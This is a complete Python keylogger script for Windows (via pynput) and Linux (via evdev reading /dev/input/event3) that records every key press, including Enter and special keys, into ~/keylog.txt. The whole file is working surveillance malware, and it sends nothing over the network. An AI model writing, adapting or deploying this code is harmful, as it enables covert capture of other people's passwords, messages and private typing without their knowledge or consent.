#!/usr/bin/env python3
import os
import sys
import platform

if platform.system() == "Windows":
    from pynput import keyboard
else:
    from evdev import InputDevice, categorize, ecodes

# Logging path
LOG_PATH = os.path.expanduser("~/keylog.txt")

def log_to_file(char):
    with open(LOG_PATH, 'a') as f:
        f.write(char)
        f.flush()

# ---- Windows Keylogger ----
def start_windows_logger():
    def on_press(key):
        try:
            if key == keyboard.Key.enter:
                log_to_file("\n")
            else:
                log_to_file(key.char)
        except AttributeError:
            log_to_file(f"<{key.name}>")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ---- Linux Keylogger ----
def start_linux_logger():
    DEVICE = '/dev/input/event3'
    keymap = {
        **{f'KEY_{chr(c)}': chr(c).lower() for c in range(ord('A'), ord('Z')+1)},
        **{f'KEY_{n}': n for n in '0123456789'},
        'KEY_SPACE': ' ',
        'KEY_ENTER': '\n',
    }

    dev = InputDevice(DEVICE)
    for event in dev.read_loop():
        if event.type == ecodes.EV_KEY and event.value == 1:
            k = categorize(event).keycode
            if isinstance(k, list): k = k[0]
            log_to_file(keymap.get(k, f"<{k}>"))

if __name__ == "__main__":
    if platform.system() == "Windows":
        start_windows_logger()
    else:
        start_linux_logger()
# This script is designed to run as a keylogger on both Windows and Linux systems.
# It captures keystrokes and logs them to a specified file.